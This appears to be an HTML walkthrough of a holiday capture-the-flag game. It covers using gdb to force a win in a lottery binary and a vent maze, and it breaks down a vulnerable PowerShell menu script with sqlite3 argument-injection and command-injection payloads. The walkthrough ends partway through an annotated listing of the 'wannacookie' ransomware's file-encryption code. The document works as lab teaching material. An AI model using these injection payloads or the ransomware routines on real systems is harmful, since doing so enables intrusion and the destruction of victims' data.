<span style="color: rgb(211, 215, 207);">         </span> <span style="color: rgb(196, 160, 0);">W</span><span style="color: rgb(204, 0, 0);">KOO</span><span style="color: rgb(196, 160, 0);">XNKKKKKKKKK</span><span style="color: rgb(204, 0, 0);">0O</span><span style="color: rgb(196, 160, 0);">KW</span> <span style="color: rgb(204, 0, 0);">KO0</span><span style="color: rgb(196, 160, 0);">XXKKKKKKKXXXXXXXXXXXK</span><span style="color: rgb(204, 0, 0);">OO</span><span style="color: rgb(196, 160, 0);">N</span>  <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">         </span>    <span style="color: rgb(196, 160, 0);">NXKNN</span><span style="color: rgb(204, 0, 0);">KOOO00</span><span style="color: rgb(196, 160, 0);">XN</span>    <span style="color: rgb(196, 160, 0);">W</span><span style="color: rgb(204, 0, 0);">00</span><span style="color: rgb(196, 160, 0);">KK</span><span style="color: rgb(204, 0, 0);">000K000</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXXKK</span><span style="color: rgb(204, 0, 0);">0</span><span style="color: rgb(196, 160, 0);">X</span>   <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">             </span>      WW    <span style="color: rgb(211, 215, 207);">     </span> W<span style="color: rgb(204, 0, 0);">KOOO0</span>   <span style="color: rgb(204, 0, 0);">KO</span><span style="color: rgb(196, 160, 0);">KKKXXXXXX</span><span style="color: rgb(204, 0, 0);">0OO</span><span style="color: rgb(196, 160, 0);">N</span> <span style="color: rgb(211, 215, 207);">                        </span>
<span style="color: rgb(211, 215, 207);">              </span> <span style="color: rgb(211, 215, 207);"> </span>    <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(211, 215, 207);">         </span> <span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">KOO0KK</span><span style="color: rgb(196, 160, 0);">NNX</span><span style="color: rgb(204, 0, 0);">KOOO</span><span style="color: rgb(196, 160, 0);">XX</span><span style="color: rgb(204, 0, 0);">OO0</span><span style="color: rgb(196, 160, 0);">X</span>W <span style="color: rgb(211, 215, 207);">                         </span>
<span style="color: rgb(211, 215, 207);">                                 </span>  W<span style="color: rgb(196, 160, 0);">N</span><span style="color: rgb(204, 0, 0);">K0OOO0K</span><span style="color: rgb(196, 160, 0);">XXNNXXN</span>   <span style="color: rgb(211, 215, 207);">                          </span>
<span style="color: rgb(211, 215, 207);">                                  </span>      W<span style="color: rgb(196, 160, 0);">WWWWW</span>      <span style="color: rgb(211, 215, 207);">                            </span>
<span style="color: rgb(211, 215, 207);">                                         </span>    <span style="color: rgb(211, 215, 207);">                                   </span>

I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
elf@776172646f67:~$</pre>
        <p>Shinny gives us a link to a <a href="https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions">SANS blog post on using gdb to run arbitrary functions</a>. So, with that in mind, lets jump into that. First let's look around.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ ls
<span style="color: rgb(0, 181, 189); font-weight: bold;">gdb</span>  <span style="color: rgb(0, 181, 189); font-weight: bold;">objdump</span>  <span style="color: rgb(0, 186, 19); font-weight: bold;">sleighbell-lotto</span>
elf@776172646f67:~$</pre>
        <p>Let's see what <kbd>sleighbell-lotto</kbd> does.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 9003!

Sorry - better luck next year!
elf@776172646f67:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 7644!

Sorry - better luck next year!
elf@776172646f67:~$ ./sleighbell-lotto

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 3237!

Sorry - better luck next year!</pre>
        <p>Let's take a look at the symbol table for the <kbd>sleighbell-lotto</kbd> program that we see.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ objdump -t sleighbell-lotto

sleighbell-lotto:     file format elf64-x86-64

SYMBOL TABLE:
0000000000000238 l    d  .interp        0000000000000000              .interp
0000000000000254 l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag
0000000000000274 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id
0000000000000298 l    d  .gnu.hash      0000000000000000              .gnu.hash
00000000000002b8 l    d  .dynsym        0000000000000000              .dynsym
00000000000004c8 l    d  .dynstr        0000000000000000              .dynstr
00000000000005e4 l    d  .gnu.version   0000000000000000              .gnu.version
0000000000000610 l    d  .gnu.version_r 0000000000000000              .gnu.version_r
0000000000000670 l    d  .rela.dyn      0000000000000000              .rela.dyn
0000000000000748 l    d  .rela.plt      0000000000000000              .rela.plt
00000000000008c8 l    d  .init  0000000000000000              .init
00000000000008e0 l    d  .plt   0000000000000000              .plt
00000000000009f0 l    d  .plt.got       0000000000000000              .plt.got
0000000000000a00 l    d  .text  0000000000000000              .text
0000000000001624 l    d  .fini  0000000000000000              .fini
0000000000001630 l    d  .rodata        0000000000000000              .rodata
0000000000006dcc l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr
0000000000006e40 l    d  .eh_frame      0000000000000000              .eh_frame
0000000000207d30 l    d  .init_array    0000000000000000              .init_array
0000000000207d38 l    d  .fini_array    0000000000000000              .fini_array
0000000000207d40 l    d  .dynamic       0000000000000000              .dynamic
0000000000207f40 l    d  .got   0000000000000000              .got
0000000000208000 l    d  .data  0000000000000000              .data
0000000000208068 l    d  .bss   0000000000000000              .bss
0000000000000000 l    d  .comment       0000000000000000              .comment
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
0000000000000a30 l     F .text  0000000000000000              deregister_tm_clones
0000000000000a70 l     F .text  0000000000000000              register_tm_clones
0000000000000ac0 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000208068 l     O .bss   0000000000000001              completed.7696
0000000000207d38 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry
0000000000000b00 l     F .text  0000000000000000              frame_dummy
0000000000207d30 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry
0000000000000000 l    df *ABS*  0000000000000000              hmac_sha256.c
0000000000000000 l    df *ABS*  0000000000000000              sleigh-bell-lotto.c
0000000000208020 l     O .data  0000000000000040              encoding_table
0000000000208078 l     O .bss   0000000000000008              decoding_table
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
000000000000702c l     O .eh_frame      0000000000000000              __FRAME_END__
0000000000000000 l    df *ABS*  0000000000000000
0000000000006dcc l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR
0000000000207f40 l     O .got   0000000000000000              _GLOBAL_OFFSET_TABLE_
0000000000207d38 l       .init_array    0000000000000000              __init_array_end
0000000000207d30 l       .init_array    0000000000000000              __init_array_start
0000000000207d40 l     O .dynamic       0000000000000000              _DYNAMIC
0000000000208000  w      .data  0000000000000000              data_start
0000000000000000       F *UND*  0000000000000000              printf@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              memset@@GLIBC_2.2.5
0000000000001620 g     F .text  0000000000000002              __libc_csu_fini
0000000000000a00 g     F .text  000000000000002b              _start
0000000000000000  w      *UND*  0000000000000000              __gmon_start__
0000000000000000       F *UND*  0000000000000000              puts@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000001624 g     F .fini  0000000000000000              _fini
0000000000000f18 g     F .text  00000000000000bf              tohex
0000000000208060 g     O .data  0000000000000008              winnermsg
0000000000000000       F *UND*  0000000000000000              malloc@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.5
<span style="color: rgb(255, 64, 64); font-weight: bold;">0000000000000fd7 g     F .text  00000000000004e0              winnerwinner</span>
0000000000000b0a g     F .text  00000000000000c2              hmac_sha256
0000000000208070 g     O .bss   0000000000000008              decoded_data
0000000000000000  w      *UND*  0000000000000000              _ITM_deregisterTMCloneTable
0000000000001630 g     O .rodata        0000000000000004              _IO_stdin_used
0000000000000000       F *UND*  0000000000000000              free@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              strlen@@GLIBC_2.2.5
0000000000000000  w      *UND*  0000000000000000              _ITM_registerTMCloneTable
0000000000208000 g       .data  0000000000000000              __data_start
0000000000000000  w    F *UND*  0000000000000000              __cxa_finalize@@GLIBC_2.2.5
0000000000000c43 g     F .text  00000000000002d5              base64_decode
0000000000000000       F *UND*  0000000000000000              sleep@@GLIBC_2.2.5
0000000000208068 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000208008 g     O .data  0000000000000000              .hidden __dso_handle
00000000000015b0 g     F .text  0000000000000065              __libc_csu_init
0000000000000000       F *UND*  0000000000000000              getenv@@GLIBC_2.2.5
0000000000208068 g       .bss   0000000000000000              __bss_start
0000000000000000       F *UND*  0000000000000000              __stack_chk_fail@@GLIBC_2.4
0000000000000000       F *UND*  0000000000000000              HMAC@@OPENSSL_1_1_0
0000000000000000       F *UND*  0000000000000000              srand@@GLIBC_2.2.5
0000000000208080 g       .bss   0000000000000000              _end
0000000000000c1e g     F .text  0000000000000025              base64_cleanup
00000000000014b7 g     F .text  0000000000000013              sorry
0000000000000bcc g     F .text  0000000000000052              build_decoding_table
0000000000000000       F *UND*  0000000000000000              EVP_sha256@@OPENSSL_1_1_0
0000000000000000       F *UND*  0000000000000000              rand@@GLIBC_2.2.5
0000000000208068 g       .data  0000000000000000              _edata
0000000000000000       F *UND*  0000000000000000              memcpy@@GLIBC_2.14
0000000000000000       F *UND*  0000000000000000              time@@GLIBC_2.2.5
00000000000014ca g     F .text  00000000000000e1              main
00000000000008c8 g     F .init  0000000000000000              _init


elf@776172646f67:~$</pre>
        <p>One symbol does kind of stand out, <kbd>winnerwinner</kbd>. Let's try jumping to that function.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ gdb -q sleighbell-lotto
Reading symbols from sleighbell-lotto...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x14ce
(gdb) run
Starting program: /home/elf/sleighbell-lotto
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555554ce in main ()
(gdb) jump winnerwinner
Continuing at 0x555555554fdb.

<span style="color: rgb(211, 215, 207);">                                                                     </span>  <span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                 </span>  <span style="color: rgb(211, 215, 207);">  </span><span style="color: rgb(204, 0, 0);">..... </span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">      ......      </span>
<span style="color: rgb(211, 215, 207);">                             </span> <span style="color: rgb(211, 215, 207);">   </span> <span style="color: rgb(211, 215, 207);">   </span><span style="color: rgb(204, 0, 0);">..,;:::::cccodkkkkkkkkkxdc;. </span>  <span style="color: rgb(211, 215, 207);">.......     </span>
<span style="color: rgb(211, 215, 207);">                      </span> <span style="color: rgb(211, 215, 207);">      </span><span style="color: rgb(204, 0, 0);">.';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.</span><span style="color: rgb(211, 215, 207);">.</span>.<span style="color: rgb(211, 215, 207);">......    </span>
<span style="color: rgb(211, 215, 207);">                     </span>   <span style="color: rgb(204, 0, 0);"> ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.</span>.<span style="color: rgb(211, 215, 207);">........   </span>
<span style="color: rgb(211, 215, 207);">                  </span>  <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc</span><span style="color: rgb(211, 215, 207);">.</span>.<span style="color: rgb(211, 215, 207);">........   </span>
<span style="color: rgb(211, 215, 207);">               </span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(204, 0, 0);">.:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">  ........   </span>
<span style="color: rgb(211, 215, 207);">             </span>  <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.</span><span style="color: rgb(211, 215, 207);"> </span>   <span style="color: rgb(211, 215, 207);">      ......    </span>
<span style="color: rgb(211, 215, 207);">           </span>  <span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                    </span>
<span style="color: rgb(211, 215, 207);">           </span> <span style="color: rgb(204, 0, 0);">.xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                      </span>
<span style="color: rgb(211, 215, 207);">         </span>  <span style="color: rgb(204, 0, 0);">.kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                        </span>
<span style="color: rgb(211, 215, 207);">         </span> <span style="color: rgb(204, 0, 0);"> xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                          </span>
<span style="color: rgb(211, 215, 207);">          </span><span style="color: rgb(204, 0, 0);">:olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                            </span>
<span style="color: rgb(211, 215, 207);">       ..</span>.<span style="color: rgb(211, 215, 207);">..</span>.<span style="color: rgb(211, 215, 207);">...</span><span style="color: rgb(204, 0, 0);">.;;;;coxkkkkkkkkkkkkkkkkkkkkkkc </span>  <span style="color: rgb(211, 215, 207);">                              </span>
<span style="color: rgb(211, 215, 207);">     ..........</span>.<span style="color: rgb(211, 215, 207);">....</span>..<span style="color: rgb(211, 215, 207);">..</span><span style="color: rgb(204, 0, 0);">,',,:lxkkkkkkkkkkkkkd.</span>  <span style="color: rgb(211, 215, 207);">                                </span>
<span style="color: rgb(211, 215, 207);">     .................</span>...<span style="color: rgb(211, 215, 207);">....</span>.<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">';;:coxkkkkk:</span><span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">                                 </span>
<span style="color: rgb(211, 215, 207);">        ............................</span>.<span style="color: rgb(211, 215, 207);">.</span><span style="color: rgb(204, 0, 0);">.ckd.</span>  <span style="color: rgb(211, 215, 207);">                                   </span>
<span style="color: rgb(211, 215, 207);">          ..............................</span><span style="color: rgb(204, 0, 0);">.</span><span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">                                     </span>
<span style="color: rgb(211, 215, 207);">                ...........................                                     </span>
<span style="color: rgb(211, 215, 207);">                   .......................                                      </span>
<span style="color: rgb(211, 215, 207);">                          </span> <span style="color: rgb(211, 215, 207);">   ....... ...                                       </span>

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.</pre>

      </div>
      <div class="border rounded p-2 m-2">
        <h2><a id="termVentMaze"></a>Google Vent Maze</h2>
        <a href="https://vents.kringlecastle.com?challenge=ventmaze" target="_blank" class="btn btn-info">Click here to open the Google Ventilation Maze in a new window</a>
        <p>There are two ways to solve this puzzle. The first is the brute force method. Simply traverse the vents until you hit a wall and turn around mapping your progress on graph paper. The second method is finding a map and that can be found in the the zip file provided in the <a href="#obj4">git repository provided by Challenge 4</a></p>
        <div class="row">
          <div class="col-6">
            <h2 class="text-center">First floor</h2>
            <img class="img-fluid" src="images/ventilation_diagram_1F.jpg">
          </div>
          <div class="col-6">
            <h2 class="text-center">Second floor</h2>
            <img class="img-fluid" src="images/ventilation_diagram_2F.jpg">
          </div>
        </div>

        <p>The entrance to the vents are by the Google desk in the main lobby. The bottom right corner of the first floor map is the starting point. You need to make your way to the <b>2</b> which gets you to the second floor vent maze through an openning upward. You exit the second floor maze in the pink circle on the right side of the map. The exit pops you out in the room with Santa, Alabaster and a snow covered Hans. This is a good way to get into that room if you're having trouble with the scan-o-matic.</p>
      </div>
    </div>

    <div class="container m-4 p-4">
      <h1>Artefacts/Materials</h1>

      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="artMenuPS1"></a>menu.ps1 program from The Name Game terminal
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntMinty">Minty Candycane Hints</a>
            <a class="dropdown-item" href="#npcMinty">Minty Candycane</a>
            <a class="dropdown-item" href="#obj2">Objective 2</a>
            <a class="dropdown-item" href="#termPwshmenu">The Name Game</a>
          </div>
        </div>
        <a href="scripts/menu.ps1">menu.ps1</a>
        <hr class="my-4">
        <p>This script is used the <a href="#termPwshmenu">The Name Game</a> as the initial menu that you get dropped into in the Cranberry Pi.</p>
        <p>The <b>Employee-Onboarding-Form</b> function does show some promise for blind SQL injection. Using <kbd>'" -cmd .dump #</kbd> we actually get the database to dump using this method.</p>
        <ul>
          <li><kbd>'"</kbd> - This escapes the <code>INSERT</code> statement and adds the next portion as an argument</li>
          <li><kbd>-cmd</kbd> - This is a sqlite3 argument that tells sqlite to <code>run "COMMAND" before reading stdin</code></li>
          <li><kbd>.dump</kbd> - This is the dump command</li>
          <li><kbd>#</kbd> - We add this to the end to comment out the rest of the arguments just in case.
        </ul>

<pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
Enter your first name.
: '" -cmd .dump #
Enter your last name.
:
Enter your street address (line 1 of 2).
:
Enter your street address (line 2 of 2).
:
Enter your city.
:
Enter your postal code.
:
Enter your phone number.
:
Enter your email address.
:


Is this correct?


'" -cmd .dump #

,


y/n: y
Save to sqlite DB using command line
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
...</pre>
        <p>It is also possible to run a shell command from sqlite3 using injection.</p>

<pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
Enter your first name.
: '" -cmd ".system runtoanswer" #
Enter your last name.
:
Enter your street address (line 1 of 2).
:
Enter your street address (line 2 of 2).
:
Enter your city.
:
Enter your postal code.
:
Enter your phone number.
:
Enter your email address.
:


Is this correct?


'" -cmd ".system runtoanswer" #

,


y/n: y
Save to sqlite DB using command line
Press Enter to continue...: Loading, please wait......



Enter Mr. Chan's first name:</pre>

        <p>There is a secret option, <kbd>9</kbd>, in the provided options. This executes <code>/usr/bin/pwsh</code> dropping us directly into a Powershell allowing us to run any command.</p>

<pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.
Please make a selection: 9
PowerShell v6.0.3
Copyright (c) Microsoft Corporation. All rights reserved.
https://aka.ms/pscore6-docs
Type 'help' to get help.
PS /home/elf></pre>

        <p>Looking at option <kbd>2</kbd> we can see why our use of <kbd>;</kbd> works.<p>

<pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
                $server = Read-Host 'Enter address of server'
                /bin/bash -c "/bin/ping -c 3 $server"</pre>

        <p>The variable <kbd>$server</kbd> is taken from user input and tacked directly into the end of a bash command. </p>
<pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">$global:firstrun = $TRUE

function Show-Menu
{
    $intro = @(
        "We just hired this new worker,",
        "Californian or New Yorker?",
        "Think he's making some new toy bag...",
        "My job is to make his name tag.",
        "",
        "Golly gee, I'm glad that you came,",
        "I recall naught but his last name!",
        "Use our system or your own plan,",
        "Find the first name of our guy `"Chan!`"",
        "",
        "-Bushy Evergreen",
        "",
        "To solve this challenge, determine the new worker's first name and submit to runtoanswer."
    )
    $header = @(
        "===================================================================="
        "=                                                                  =",
        "= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =",
        "=                                                                  =",
        "===================================================================="
    )

    cls
    if ($global:firstrun -eq $TRUE) {
        Write-Host "`n`n"
        for ($i = 0; $i -lt $intro.length; $i++) {
            Write-Host $intro[$i]
        }
        $global:firstrun = $FALSE
    }

    Write-Host "`n`n`n"
    for ($i = 0; $i -lt $header.length; $i++) {
        Write-Host $header[$i]
    }
    Write-Host "`n`n`n"
    Write-Host ' Press '1' to start the onboard process.'
    Write-Host ' Press '2' to verify the system.'
    Write-Host ' Press 'q' to quit.'
    Write-Host "`n"
}

function Employee-Onboarding-Form
{
    Write-Host "`n`nWelcome to Santa's Castle!`n`n"
    Write-Host "At Santa's Castle, our employees are our family. We care for each other,"
    Write-Host "and support everyone in our common goals.`n"
    Write-Host "Your first test at Santa's Castle is to complete the new employee onboarding paperwork."
    Write-Host "Don't worry, it's an easy test! Just complete the required onboarding information below.`n`n"

    $efirst = Read-Host "Enter your first name.`n"
    $elast = Read-Host "Enter your last name.`n"
    $estreet1 = Read-Host "Enter your street address (line 1 of 2).`n"
    $estreet2 = Read-Host "Enter your street address (line 2 of 2).`n"
    $ecity = Read-Host "Enter your city.`n"
    $epostalcode = Read-Host "Enter your postal code.`n"
    $ephone = Read-Host "Enter your phone number.`n"
    $eemail = Read-Host "Enter your email address.`n"

    Write-Host "`n`nIs this correct?`n`n"
    Write-Host "$efirst $elast"
    Write-Host "$estreet1"
    if ($estreet2) {
        Write-Host "$estreet2"
    }
    Write-Host "$ecity, $epostalcode"
    Write-Host "$ephone"
    Write-Host "$eemail"

    $input = Read-Host 'y/n'
    if ($input -eq 'y' -Or $input -eq 'Y') {
        Write-Host "Save to sqlite DB using command line"
        Start-Process -FilePath "./sqlite3" -ArgumentList "onboard.db `"INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (`'$efirst`',`'$elast`', `'$estreet1`', `'$estreet2`', `'$ecity`', `'$epostalcode`', `'$ephone`', `'$eemail`')`""
    }
}

try
{
    do
    {
        Show-Menu
        $input = Read-Host 'Please make a selection'
        switch ($input)
        {
            '1' {
                cls
                Employee-Onboarding-Form
            } '2' {
                cls
                Write-Host "Validating data store for employee onboard information."
                $server = Read-Host 'Enter address of server'
                /bin/bash -c "/bin/ping -c 3 $server"
                /bin/bash -c "/usr/bin/file onboard.db"
            } '9' {
                /usr/bin/pwsh
                return
            } 'q' {
                return
            } default {
                Write-Host "Invalid entry."
            }
        }
        pause
    }
    until ($input -eq 'q')
} finally {
}</pre>

      </div>

      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="artWannacookie"></a>Wannacookie Source Code
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#obj93">Objective 9.3</a>
          </div>
        </div>
        <p>This is a breakdown of the <a href="artefacts/wannacookie.min.ps1">wannacookie.min.ps1</a> source code. We were also able to download a file called <a href="artefacts/wannacookie.ps1">wannacookie.ps1</a> which appears to be a non-minimized version of the <code>wannacookie.min.ps1</code> file. It doesn't work as is, but many of the functions are fully named as opposed to moderately obfuscated. For example the function <kbd>p_k_e</kbd> in the <b>.min</b> file is <kbd>Pub_Key_Enc</kbd> in the other file. Mouse over the different functions to get an idea of what they do.</p>
        <p>One additional note about this malware is that it doesn't appear to mix of the letters of "hansgruber" as we saw in the snort challenge. Perhaps that's in wannacookie 2.0? :)</p>
        <pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
$functions = {
  <span data-toggle="tooltip" title="Encode and Decode File">function e_d_file ($key,$File,$enc_it) {
    [byte[]]$key = $key;
    $Suffix = "`.wannacookie";
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
    [System.Int32]$KeySize = $key.Length * 8;
    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $AESP.BlockSize = 128;
    $AESP.KeySize = $KeySize;
    $AESP.Key = $key;
    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
    if ($enc_it) {
      $DestFile = $File + $Suffix
    } else {
      $DestFile = ($File -replace $Suffix)
    };
    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
    if ($enc_it) {
      $AESP.GenerateIV();
      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
      $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4;
      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($LenIV,0,3) | Out-Null;
      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
      [Byte[]]$IV = New-Object Byte[] $LIV;
      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($IV,0,$LIV) | Out-Null;
      $AESP.IV = $IV;
      $Transform = $AESP.CreateDecryptor() };
    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
    [int]$Count = 0;
    [int]$BlockSzBts = $AESP.BlockSize / 8;
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
    do {
      $Count = $FileSR.Read($Data,0,$BlockSzBts);
      $CryptoS.Write($Data,0,$Count)
    } while ($Count -gt 0);
    $CryptoS.FlushFinalBlock();
    $CryptoS.Close();
    $FileSR.Close();
    $FileSW.Close();
    Clear-Variable -Name "key";
    Remove-Item $File } };</span>
<span data-toggle="tooltip" title="Hex to Byte array">function H2B { param($HX);
  $HX = $HX -split '(..)' | Where-Object { $_ };
  foreach ($value in $HX) { [Convert]::ToInt32($value,16) } };</span>
<span data-toggle="tooltip" title="ASCII to Hex">function A2H () { param($a);
  $c = '';
  $b = $a.ToCharArray();
  ;
  foreach ($element in $b) { $c = $c + " " + [System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element)) };
  return $c -replace ' ' };</span>
<span data-toggle="tooltip" title="Hex to ASCII">function H2A () { param($a);
  $outa;
  $a -split '(..)' | Where-Object { $_ } | ForEach-Object { [char]([convert]::ToInt16($_,16)) } | ForEach-Object { $outa = $outa + $_ };
  return $outa };</span>
<span data-toggle="tooltip" title="Byte array to Hex">function B2H { param($DEC);
  $tmp = '';
  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value;
    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a } };
  return $tmp };</span>
<span data-toggle="tooltip" title="XOR Function">function ti_rox { param($b1,$b2);
  $b1 = $(H2B $b1);
  $b2 = $(H2B $b2);
  $cont = New-Object Byte[] $b1.count;
  if ($b1.count -eq $b2.count) {
    for ($i = 0; $i -lt $b1.count; $i++) { $cont[$i] = $b1[$i] -bxor $b2[$i] } };
  return $cont };</span>
<span data-toggle="tooltip" title="Byte array to a Gzip stream">function B2G { param([byte[]]$Data);
  process { $out = [System.IO.MemoryStream]::new();
    $gStream = New-Object System.IO.Compression.GzipStream $out,([IO.Compression.CompressionMode]::Compress);
    $gStream.Write($Data,0,$Data.Length);
    $gStream.Close();
    return $out.ToArray() } };</span>
<span data-toggle="tooltip" title="Gzip stream to a Byte array">function G2B { param([byte[]]$Data);
  process { $SrcData = New-Object System.IO.MemoryStream (,$Data);
    $output = New-Object System.IO.MemoryStream;
    $gStream = New-Object System.IO.Compression.GzipStream $SrcData,([IO.Compression.CompressionMode]::Decompress);
    $gStream.CopyTo($output);
    $gStream.Close();
    $SrcData.Close();
    [byte[]]$byteArr = $output.ToArray();
    return $byteArr } };</span>
<span data-toggle="tooltip" title="SHA1">function sh1 ([string]$String) { $SB = New-Object System.Text.StringBuilder;
  [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String)) | ForEach-Object { [void]$SB.Append($_.ToString("x2")) };
  $SB.ToString() };</span>
<span data-toggle="tooltip" title="Public Key Encryption">function p_k_e ($key_bytes,[byte[]]$pub_bytes) { $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
  $cert.Import($pub_bytes);
  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
  return $(B2H $encKey) };</span>
<span data-toggle="tooltip" title="Encode and Decode">function e_n_d { param($key,$allfiles,$make_cookie);
  $tcount = 12;
  for ($file = 0;
    $file -lt $allfiles.Length;
